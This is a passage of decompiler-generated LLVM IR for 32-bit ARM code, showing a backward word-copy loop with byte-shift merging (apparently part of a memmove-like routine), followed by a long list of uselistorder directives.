  %v6_15f50 = icmp slt i32 %v0_15f4c, 16
  br i1 %v6_15f50, label %dec_label_pc_15f54, label %dec_label_pc_15f24.dec_label_pc_15f24_crit_edge

dec_label_pc_15f24.dec_label_pc_15f24_crit_edge:  ; preds = %dec_label_pc_15f24
  %v0_15f24.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15f28.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f24

dec_label_pc_15f54:                               ; preds = %dec_label_pc_15f24
  %v2_15f54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15f54, i32* @r4, align 4
  %v5_15f54 = load i8*, i8** %stack_var_-8, align 4
  %v6_15f54 = ptrtoint i8* %v5_15f54 to i32
  store i32 %v6_15f54, i32* @r5, align 4
  store i32 %v11_15f20, i32* @lr, align 4
  %v2_15f58 = add i32 %v0_15f4c, -4
  store i32 %v2_15f58, i32* %r2.global-to-local, align 4
  %v4_15f58 = add i32 %v0_15f4c, 2147483632
  %v5_15f58 = and i32 %v2_15f58, %v4_15f58
  %v6_15f58 = icmp slt i32 %v5_15f58, 0
  store i1 %v6_15f58, i1* %cpsr_v.global-to-local, align 1
  %v7_15f58 = icmp slt i32 %v2_15f58, 0
  store i1 %v7_15f58, i1* %cpsr_n.global-to-local, align 1
  %v5_15f5c = icmp slt i32 %v2_15f4c, -12
  br i1 %v5_15f5c, label %dec_label_pc_15f78, label %dec_label_pc_15f60

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f54, %dec_label_pc_15f14, %dec_label_pc_15f60
  %v1_15f6c = phi i32 [ %v5_15f6c, %dec_label_pc_15f60 ], [ %v1_15f48, %dec_label_pc_15f54 ], [ %v0_15f4831, %dec_label_pc_15f14 ]
  %v0_15f60 = load i32, i32* %r3.global-to-local, align 4
  %v3_15f60 = mul i32 %v0_15f60, 256
  store i32 %v3_15f60, i32* %ip.global-to-local, align 4
  %v0_15f64 = load i32, i32* %r1.global-to-local, align 4
  %v1_15f64 = add i32 %v0_15f64, -4
  %v2_15f64 = inttoptr i32 %v1_15f64 to i32*
  %v3_15f64 = load i32, i32* %v2_15f64, align 4
  store i32 %v3_15f64, i32* %r3.global-to-local, align 4
  store i32 %v1_15f64, i32* %r1.global-to-local, align 4
  %v4_15f68 = udiv i32 %v3_15f64, 16777216
  %v5_15f68 = or i32 %v4_15f68, %v3_15f60
  store i32 %v5_15f68, i32* %ip.global-to-local, align 4
  %v2_15f6c = add i32 %v1_15f6c, -4
  %v3_15f6c = inttoptr i32 %v2_15f6c to i32*
  store i32 %v5_15f68, i32* %v3_15f6c, align 4
  %v4_15f6c = load i32, i32* %r0.global-to-local, align 4
  %v5_15f6c = add i32 %v4_15f6c, -4
  store i32 %v5_15f6c, i32* %r0.global-to-local, align 4
  %v0_15f70 = load i32, i32* %r2.global-to-local, align 4
  %v2_15f70 = add i32 %v0_15f70, -4
  store i32 %v2_15f70, i32* %r2.global-to-local, align 4
  %v6_15f74 = icmp slt i32 %v0_15f70, 4
  br i1 %v6_15f74, label %dec_label_pc_15f78.loopexit, label %dec_label_pc_15f60

dec_label_pc_15f78.loopexit:                      ; preds = %dec_label_pc_15f60
  %v4_15f70 = sub i32 3, %v0_15f70
  %v5_15f70 = and i32 %v4_15f70, %v0_15f70
  %v6_15f70 = icmp slt i32 %v5_15f70, 0
  %v7_15f70 = icmp slt i32 %v2_15f70, 0
  store i1 %v6_15f70, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15f70, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15f78

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f78.loopexit, %dec_label_pc_15f54
  %v2_15ebc63 = phi i32 [ %v5_15f6c, %dec_label_pc_15f78.loopexit ], [ %v1_15f48, %dec_label_pc_15f54 ]
  %v0_15eac59 = phi i32 [ %v2_15f70, %dec_label_pc_15f78.loopexit ], [ %v2_15f58, %dec_label_pc_15f54 ]
  %v0_15f78 = load i32, i32* %r1.global-to-local, align 4
  %v1_15f78 = add i32 %v0_15f78, 3
  store i32 %v1_15f78, i32* %r1.global-to-local, align 4
  br label %bb143

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f10
  br i1 %v5_15ff0, label %dec_label_pc_15fcc, label %dec_label_pc_15f88

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f80
  store i32 %v2_15fec, i32* %r2.global-to-local, align 4
  %v3_15f8c = load i32, i32* @r4, align 4
  store i32 %v3_15f8c, i32* %stack_var_-12, align 4
  %v6_15f8c = load i32, i32* @r5, align 4
  %v8_15f8c = inttoptr i32 %v6_15f8c to i8*
  store i8* %v8_15f8c, i8** %stack_var_-8, align 4
  %v11_15f8c = load i32, i32* @lr, align 4
  br label %dec_label_pc_15f90

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f90.dec_label_pc_15f90_crit_edge, %dec_label_pc_15f88
  %v0_15fb4 = phi i32 [ %v1_15fb4, %dec_label_pc_15f90.dec_label_pc_15f90_crit_edge ], [ %v0_15f4831, %dec_label_pc_15f88 ]
  %v0_15f94 = phi i32 [ %v0_15f94.pre, %dec_label_pc_15f90.dec_label_pc_15f90_crit_edge ], [ %v1_15f00, %dec_label_pc_15f88 ]
  %v0_15f90 = phi i32 [ %v0_15f90.pre, %dec_label_pc_15f90.dec_label_pc_15f90_crit_edge ], [ %v2_15f04, %dec_label_pc_15f88 ]
  %v3_15f90 = mul i32 %v0_15f90, 65536
  store i32 %v3_15f90, i32* %lr.global-to-local, align 4
  %v1_15f94 = add i32 %v0_15f94, -4
  %v2_15f94 = inttoptr i32 %v1_15f94 to i32*
  %v3_15f94 = load i32, i32* %v2_15f94, align 4
  store i32 %v3_15f94, i32* %r3.global-to-local, align 4
  %v4_15f94 = add i32 %v0_15f94, -8
  %v5_15f94 = inttoptr i32 %v4_15f94 to i32*
  %v6_15f94 = load i32, i32* %v5_15f94, align 4
  store i32 %v6_15f94, i32* %r4.global-to-local, align 4
  %v7_15f94 = add i32 %v0_15f94, -12
  %v8_15f94 = inttoptr i32 %v7_15f94 to i32*
  %v9_15f94 = load i32, i32* %v8_15f94, align 4
  store i32 %v9_15f94, i32* %r5.global-to-local, align 4
  %v10_15f94 = add i32 %v0_15f94, -16
  %v11_15f94 = inttoptr i32 %v10_15f94 to i32*
  %v12_15f94 = load i32, i32* %v11_15f94, align 4
  store i32 %v10_15f94, i32* %r1.global-to-local, align 4
  %v4_15f98 = udiv i32 %v12_15f94, 65536
  %v5_15f98 = or i32 %v4_15f98, %v3_15f90
  store i32 %v5_15f98, i32* %lr.global-to-local, align 4
  %v3_15f9c = mul i32 %v12_15f94, 65536
  %v4_15fa0 = udiv i32 %v9_15f94, 65536
  %v5_15fa0 = or i32 %v3_15f9c, %v4_15fa0
  store i32 %v5_15fa0, i32* %ip.global-to-local, align 4
  %v3_15fa4 = mul i32 %v9_15f94, 65536
  %v4_15fa8 = udiv i32 %v6_15f94, 65536
  %v5_15fa8 = or i32 %v3_15fa4, %v4_15fa8
  store i32 %v5_15fa8, i32* %r5.global-to-local, align 4
  %v3_15fac = mul i32 %v6_15f94, 65536
  %v4_15fb0 = udiv i32 %v3_15f94, 65536
  %v5_15fb0 = or i32 %v3_15fac, %v4_15fb0
  store i32 %v5_15fb0, i32* %r4.global-to-local, align 4
  %v1_15fb4 = add i32 %v0_15fb4, -16
  %v2_15fb4 = inttoptr i32 %v1_15fb4 to i32*
  store i32 %v5_15fb0, i32* %v2_15fb4, align 4
  %v4_15fb4 = add i32 %v0_15fb4, -12
  %v5_15fb4 = inttoptr i32 %v4_15fb4 to i32*
  %v6_15fb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15fb4, i32* %v5_15fb4, align 4
  %v7_15fb4 = add i32 %v0_15fb4, -8
  %v8_15fb4 = inttoptr i32 %v7_15fb4 to i32*
  %v9_15fb4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15fb4, i32* %v8_15fb4, align 4
  %v10_15fb4 = add i32 %v0_15fb4, -4
  %v11_15fb4 = inttoptr i32 %v10_15fb4 to i32*
  %v12_15fb4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15fb4, i32* %v11_15fb4, align 4
  store i32 %v1_15fb4, i32* %r0.global-to-local, align 4
  %v0_15fb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15fb8 = add i32 %v0_15fb8, -16
  store i32 %v2_15fb8, i32* %r2.global-to-local, align 4
  %v6_15fbc = icmp slt i32 %v0_15fb8, 16
  br i1 %v6_15fbc, label %dec_label_pc_15fc0, label %dec_label_pc_15f90.dec_label_pc_15f90_crit_edge

dec_label_pc_15f90.dec_label_pc_15f90_crit_edge:  ; preds = %dec_label_pc_15f90
  %v0_15f90.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15f94.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15f90

dec_label_pc_15fc0:                               ; preds = %dec_label_pc_15f90
  %v2_15fc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15fc0, i32* @r4, align 4
  %v5_15fc0 = load i8*, i8** %stack_var_-8, align 4
  %v6_15fc0 = ptrtoint i8* %v5_15fc0 to i32
  store i32 %v6_15fc0, i32* @r5, align 4
  store i32 %v11_15f8c, i32* @lr, align 4
  %v2_15fc4 = add i32 %v0_15fb8, -4
  store i32 %v2_15fc4, i32* %r2.global-to-local, align 4
  %v4_15fc4 = add i32 %v0_15fb8, 2147483632
  %v5_15fc4 = and i32 %v2_15fc4, %v4_15fc4
  %v6_15fc4 = icmp slt i32 %v5_15fc4, 0
  store i1 %v6_15fc4, i1* %cpsr_v.global-to-local, align 1
  %v7_15fc4 = icmp slt i32 %v2_15fc4, 0
  store i1 %v7_15fc4, i1* %cpsr_n.global-to-local, align 1
  %v5_15fc8 = icmp slt i32 %v2_15fb8, -12
  br i1 %v5_15fc8, label %dec_label_pc_15fe4, label %dec_label_pc_15fcc

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15fc0, %dec_label_pc_15f80, %dec_label_pc_15fcc
  %v1_15fd8 = phi i32 [ %v5_15fd8, %dec_label_pc_15fcc ], [ %v1_15fb4, %dec_label_pc_15fc0 ], [ %v0_15f4831, %dec_label_pc_15f80 ]
  %v0_15fcc = load i32, i32* %r3.global-to-local, align 4
  %v3_15fcc = mul i32 %v0_15fcc, 65536
  store i32 %v3_15fcc, i32* %ip.global-to-local, align 4
  %v0_15fd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fd0 = add i32 %v0_15fd0, -4
  %v2_15fd0 = inttoptr i32 %v1_15fd0 to i32*
  %v3_15fd0 = load i32, i32* %v2_15fd0, align 4
  store i32 %v3_15fd0, i32* %r3.global-to-local, align 4
  store i32 %v1_15fd0, i32* %r1.global-to-local, align 4
  %v4_15fd4 = udiv i32 %v3_15fd0, 65536
  %v5_15fd4 = or i32 %v4_15fd4, %v3_15fcc
  store i32 %v5_15fd4, i32* %ip.global-to-local, align 4
  %v2_15fd8 = add i32 %v1_15fd8, -4
  %v3_15fd8 = inttoptr i32 %v2_15fd8 to i32*
  store i32 %v5_15fd4, i32* %v3_15fd8, align 4
  %v4_15fd8 = load i32, i32* %r0.global-to-local, align 4
  %v5_15fd8 = add i32 %v4_15fd8, -4
  store i32 %v5_15fd8, i32* %r0.global-to-local, align 4
  %v0_15fdc = load i32, i32* %r2.global-to-local, align 4
  %v2_15fdc = add i32 %v0_15fdc, -4
  store i32 %v2_15fdc, i32* %r2.global-to-local, align 4
  %v6_15fe0 = icmp slt i32 %v0_15fdc, 4
  br i1 %v6_15fe0, label %dec_label_pc_15fe4.loopexit, label %dec_label_pc_15fcc

dec_label_pc_15fe4.loopexit:                      ; preds = %dec_label_pc_15fcc
  %v4_15fdc = sub i32 3, %v0_15fdc
  %v5_15fdc = and i32 %v4_15fdc, %v0_15fdc
  %v6_15fdc = icmp slt i32 %v5_15fdc, 0
  %v7_15fdc = icmp slt i32 %v2_15fdc, 0
  store i1 %v6_15fdc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15fdc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15fe4

dec_label_pc_15fe4:                               ; preds = %dec_label_pc_15fe4.loopexit, %dec_label_pc_15fc0
  %v2_15ebc64 = phi i32 [ %v5_15fd8, %dec_label_pc_15fe4.loopexit ], [ %v1_15fb4, %dec_label_pc_15fc0 ]
  %v0_15eac60 = phi i32 [ %v2_15fdc, %dec_label_pc_15fe4.loopexit ], [ %v2_15fc4, %dec_label_pc_15fc0 ]
  %v0_15fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fe4 = add i32 %v0_15fe4, 2
  store i32 %v1_15fe4, i32* %r1.global-to-local, align 4
  br label %bb143

dec_label_pc_15fec:                               ; preds = %dec_label_pc_15f00
  br i1 %v5_15ff0, label %dec_label_pc_16038, label %dec_label_pc_15ff4

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fec
  store i32 %v2_15fec, i32* %r2.global-to-local, align 4
  %v3_15ff8 = load i32, i32* @r4, align 4
  store i32 %v3_15ff8, i32* %stack_var_-12, align 4
  %v6_15ff8 = load i32, i32* @r5, align 4
  %v8_15ff8 = inttoptr i32 %v6_15ff8 to i8*
  store i8* %v8_15ff8, i8** %stack_var_-8, align 4
  %v11_15ff8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15ffc.dec_label_pc_15ffc_crit_edge, %dec_label_pc_15ff4
  %v0_16020 = phi i32 [ %v1_16020, %dec_label_pc_15ffc.dec_label_pc_15ffc_crit_edge ], [ %v0_15f4831, %dec_label_pc_15ff4 ]
  %v0_16000 = phi i32 [ %v0_16000.pre, %dec_label_pc_15ffc.dec_label_pc_15ffc_crit_edge ], [ %v1_15f00, %dec_label_pc_15ff4 ]
  %v0_15ffc = phi i32 [ %v0_15ffc.pre, %dec_label_pc_15ffc.dec_label_pc_15ffc_crit_edge ], [ %v2_15f04, %dec_label_pc_15ff4 ]
  %v3_15ffc = mul i32 %v0_15ffc, 16777216
  store i32 %v3_15ffc, i32* %lr.global-to-local, align 4
  %v1_16000 = add i32 %v0_16000, -4
  %v2_16000 = inttoptr i32 %v1_16000 to i32*
  %v3_16000 = load i32, i32* %v2_16000, align 4
  store i32 %v3_16000, i32* %r3.global-to-local, align 4
  %v4_16000 = add i32 %v0_16000, -8
  %v5_16000 = inttoptr i32 %v4_16000 to i32*
  %v6_16000 = load i32, i32* %v5_16000, align 4
  store i32 %v6_16000, i32* %r4.global-to-local, align 4
  %v7_16000 = add i32 %v0_16000, -12
  %v8_16000 = inttoptr i32 %v7_16000 to i32*
  %v9_16000 = load i32, i32* %v8_16000, align 4
  store i32 %v9_16000, i32* %r5.global-to-local, align 4
  %v10_16000 = add i32 %v0_16000, -16
  %v11_16000 = inttoptr i32 %v10_16000 to i32*
  %v12_16000 = load i32, i32* %v11_16000, align 4
  store i32 %v10_16000, i32* %r1.global-to-local, align 4
  %v4_16004 = udiv i32 %v12_16000, 256
  %v5_16004 = or i32 %v4_16004, %v3_15ffc
  store i32 %v5_16004, i32* %lr.global-to-local, align 4
  %v3_16008 = mul i32 %v12_16000, 16777216
  %v4_1600c = udiv i32 %v9_16000, 256
  %v5_1600c = or i32 %v3_16008, %v4_1600c
  store i32 %v5_1600c, i32* %ip.global-to-local, align 4
  %v3_16010 = mul i32 %v9_16000, 16777216
  %v4_16014 = udiv i32 %v6_16000, 256
  %v5_16014 = or i32 %v3_16010, %v4_16014
  store i32 %v5_16014, i32* %r5.global-to-local, align 4
  %v3_16018 = mul i32 %v6_16000, 16777216
  %v4_1601c = udiv i32 %v3_16000, 256
  %v5_1601c = or i32 %v3_16018, %v4_1601c
  store i32 %v5_1601c, i32* %r4.global-to-local, align 4
  %v1_16020 = add i32 %v0_16020, -16
  %v2_16020 = inttoptr i32 %v1_16020 to i32*
  store i32 %v5_1601c, i32* %v2_16020, align 4
  %v4_16020 = add i32 %v0_16020, -12
  %v5_16020 = inttoptr i32 %v4_16020 to i32*
  %v6_16020 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16020, i32* %v5_16020, align 4
  %v7_16020 = add i32 %v0_16020, -8
  %v8_16020 = inttoptr i32 %v7_16020 to i32*
  %v9_16020 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16020, i32* %v8_16020, align 4
  %v10_16020 = add i32 %v0_16020, -4
  %v11_16020 = inttoptr i32 %v10_16020 to i32*
  %v12_16020 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16020, i32* %v11_16020, align 4
  store i32 %v1_16020, i32* %r0.global-to-local, align 4
  %v0_16024 = load i32, i32* %r2.global-to-local, align 4
  %v2_16024 = add i32 %v0_16024, -16
  store i32 %v2_16024, i32* %r2.global-to-local, align 4
  %v6_16028 = icmp slt i32 %v0_16024, 16
  br i1 %v6_16028, label %dec_label_pc_1602c, label %dec_label_pc_15ffc.dec_label_pc_15ffc_crit_edge

dec_label_pc_15ffc.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15ffc
  %v0_15ffc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_16000.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_1602c:                               ; preds = %dec_label_pc_15ffc
  %v2_1602c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1602c, i32* @r4, align 4
  %v5_1602c = load i8*, i8** %stack_var_-8, align 4
  %v6_1602c = ptrtoint i8* %v5_1602c to i32
  store i32 %v6_1602c, i32* @r5, align 4
  store i32 %v11_15ff8, i32* @lr, align 4
  %v2_16030 = add i32 %v0_16024, -4
  store i32 %v2_16030, i32* %r2.global-to-local, align 4
  %v4_16030 = add i32 %v0_16024, 2147483632
  %v5_16030 = and i32 %v2_16030, %v4_16030
  %v6_16030 = icmp slt i32 %v5_16030, 0
  store i1 %v6_16030, i1* %cpsr_v.global-to-local, align 1
  %v7_16030 = icmp slt i32 %v2_16030, 0
  store i1 %v7_16030, i1* %cpsr_n.global-to-local, align 1
  %v5_16034 = icmp slt i32 %v2_16024, -12
  br i1 %v5_16034, label %dec_label_pc_16050, label %dec_label_pc_16038

dec_label_pc_16038:                               ; preds = %dec_label_pc_1602c, %dec_label_pc_15fec, %dec_label_pc_16038
  %v1_16044 = phi i32 [ %v5_16044, %dec_label_pc_16038 ], [ %v1_16020, %dec_label_pc_1602c ], [ %v0_15f4831, %dec_label_pc_15fec ]
  %v0_16038 = load i32, i32* %r3.global-to-local, align 4
  %v3_16038 = mul i32 %v0_16038, 16777216
  store i32 %v3_16038, i32* %ip.global-to-local, align 4
  %v0_1603c = load i32, i32* %r1.global-to-local, align 4
  %v1_1603c = add i32 %v0_1603c, -4
  %v2_1603c = inttoptr i32 %v1_1603c to i32*
  %v3_1603c = load i32, i32* %v2_1603c, align 4
  store i32 %v3_1603c, i32* %r3.global-to-local, align 4
  store i32 %v1_1603c, i32* %r1.global-to-local, align 4
  %v4_16040 = udiv i32 %v3_1603c, 256
  %v5_16040 = or i32 %v4_16040, %v3_16038
  store i32 %v5_16040, i32* %ip.global-to-local, align 4
  %v2_16044 = add i32 %v1_16044, -4
  %v3_16044 = inttoptr i32 %v2_16044 to i32*
  store i32 %v5_16040, i32* %v3_16044, align 4
  %v4_16044 = load i32, i32* %r0.global-to-local, align 4
  %v5_16044 = add i32 %v4_16044, -4
  store i32 %v5_16044, i32* %r0.global-to-local, align 4
  %v0_16048 = load i32, i32* %r2.global-to-local, align 4
  %v2_16048 = add i32 %v0_16048, -4
  store i32 %v2_16048, i32* %r2.global-to-local, align 4
  %v6_1604c = icmp slt i32 %v0_16048, 4
  br i1 %v6_1604c, label %dec_label_pc_16050.loopexit, label %dec_label_pc_16038

dec_label_pc_16050.loopexit:                      ; preds = %dec_label_pc_16038
  %v4_16048 = sub i32 3, %v0_16048
  %v5_16048 = and i32 %v4_16048, %v0_16048
  %v6_16048 = icmp slt i32 %v5_16048, 0
  %v7_16048 = icmp slt i32 %v2_16048, 0
  store i1 %v6_16048, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16048, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_16050

dec_label_pc_16050:                               ; preds = %dec_label_pc_16050.loopexit, %dec_label_pc_1602c
  %v2_15ebc65 = phi i32 [ %v5_16044, %dec_label_pc_16050.loopexit ], [ %v1_16020, %dec_label_pc_1602c ]
  %v0_15eac61 = phi i32 [ %v2_16048, %dec_label_pc_16050.loopexit ], [ %v2_16030, %dec_label_pc_1602c ]
  %v0_16050 = load i32, i32* %r1.global-to-local, align 4
  %v1_16050 = add i32 %v0_16050, 1
  store i32 %v1_16050, i32* %r1.global-to-local, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_16044, { 0, 2, 1 }
  uselistorder i32 %v3_16038, { 1, 0 }
  uselistorder i32 %v2_16030, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16020, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16000, { 1, 0 }
  uselistorder i32 %v3_15ffc, { 1, 0 }
  uselistorder i32 %v0_16000, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16020, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15fd8, { 0, 2, 1 }
  uselistorder i32 %v3_15fcc, { 1, 0 }
  uselistorder i32 %v2_15fc4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15fb4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15f94, { 1, 0 }
  uselistorder i32 %v3_15f90, { 1, 0 }
  uselistorder i32 %v0_15f94, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15fb4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15f6c, { 0, 2, 1 }
  uselistorder i32 %v3_15f60, { 1, 0 }
  uselistorder i32 %v2_15f58, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15f48, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15f28, { 1, 0 }
  uselistorder i32 %v3_15f24, { 1, 0 }
  uselistorder i32 %v0_15f28, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15f48, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15ff0, { 2, 0, 1 }
  uselistorder i32 %v0_15f08, { 1, 0 }
  uselistorder i32 %v0_15ff4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_15f4831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15ef8, { 2, 1, 0 }
  uselistorder i32 %v0_15ef8, { 2, 0, 1 }
  uselistorder i32 %v2_15ef0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15ef0, { 1, 0, 2 }
  uselistorder i32 %v0_15ef0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15f4832, { 2, 1, 0 }
  uselistorder i32 %v11_15ecc, { 1, 0 }
  uselistorder i32 %v7_15ecc, { 1, 0 }
  uselistorder i32 %v1_15eac, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15eac, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15eb0, { 1, 0 }
  uselistorder i32 %v7_15ea4, { 0, 2, 1 }
  uselistorder i32 %v10_15ea0, { 1, 0 }
  uselistorder i32 %v9_15e98, { 1, 0, 2 }
  uselistorder i32 %v6_15e94, { 1, 0 }
  uselistorder i32 %v2_15e8c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_15e8c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15e9c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15e80, { 0, 2, 1 }
  uselistorder i32 %v13_15e7c, { 1, 0 }
  uselistorder i32 %v4_15e78, { 0, 2, 1, 3 }
  uselistorder i32 %v0_15e78, { 2, 0, 1 }
  uselistorder i32 %v6_15e80, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15e70, { 0, 2, 1 }
  uselistorder i32 %v16_15e6c, { 1, 0 }
  uselistorder i32 %v4_15e68, { 1, 0 }
  uselistorder i32 %v0_15e78.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15e70, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15e5c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15e58, { 1, 0 }
  uselistorder i32 %v1_15e54, { 1, 0 }
  uselistorder i32 %v10_15e50, { 1, 0 }
  uselistorder i32 %v0_15e50, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15e54, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15e48, { 0, 2, 1 }
  uselistorder i32 %v2_15e3c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_15e3c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_15e5449, { 1, 2, 0 }
  uselistorder i32 %v1_15e34, { 2, 1, 0 }
  uselistorder i32 %v1_15e2c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15e24, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15e20, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_15e1c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_15e1c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_15e08, { 0, 2, 1 }
  uselistorder i32 %v3_15dfc, { 1, 0 }
  uselistorder i32 %v2_15df4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15de4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15dc4, { 1, 0, 2 }
  uselistorder i32 %v5_15dc4, { 1, 0, 2 }
  uselistorder i32 %v2_15dc4, { 1, 0, 2 }
  uselistorder i32 %v3_15dc0, { 1, 0 }
  uselistorder i32 %v0_15dc4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15de4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15d9c, { 0, 2, 1 }
  uselistorder i32 %v3_15d90, { 1, 0 }
  uselistorder i32 %v2_15d88, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15d78, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15d58, { 1, 0, 2 }
  uselistorder i32 %v5_15d58, { 1, 0, 2 }
  uselistorder i32 %v2_15d58, { 1, 0, 2 }
  uselistorder i32 %v3_15d54, { 1, 0 }
  uselistorder i32 %v0_15d58, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15d78, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15d30, { 0, 2, 1 }
  uselistorder i32 %v3_15d24, { 1, 0 }
  uselistorder i32 %v2_15d1c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_15d0c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15cec, { 1, 0, 2 }
  uselistorder i32 %v5_15cec, { 1, 0, 2 }
  uselistorder i32 %v2_15cec, { 1, 0, 2 }
  uselistorder i32 %v3_15ce8, { 1, 0 }
  uselistorder i32 %v0_15cec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15d0c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_15db4, { 2, 0, 1 }
  uselistorder i32 %v0_15db8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_15d0c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15cbc, { 1, 0 }
  uselistorder i32 %v0_15cbc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_15cb4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15cb4, { 1, 0, 2 }
  uselistorder i32 %v0_15cb4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15d0c76, { 2, 1, 0 }
  uselistorder i32 %v1_15c94, { 1, 0, 2 }
  uselistorder i32 %v1_15c6c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15c6c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_15c58, { 1, 0, 2 }
  uselistorder i32 %v6_15c54, { 1, 0 }
  uselistorder i32 %v2_15c4c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_15c4c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15c5c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_15c44, { 0, 2, 1 }
  uselistorder i1 %v0_15c44, { 1, 0 }
  uselistorder i1 %v1_15c44, { 1, 0 }
  uselistorder i32 %v3_15c40, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15c38, { 0, 2, 1, 3 }
  uselistorder i32 %v4_15c24, { 1, 0 }
  uselistorder i32 %v12_15c18, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15c0c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15c10, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_15c00, { 0, 2, 1 }
  uselistorder i32 %v2_15bf8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_15bf8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_15bf0, { 1, 0 }
  uselistorder i32 %v1_15be8, { 2, 1, 0 }
  uselistorder i32 %v2_15be0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_15be0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15bd0, { 1, 0 }
  uselistorder i32 %v1_15bd0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_15bd0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
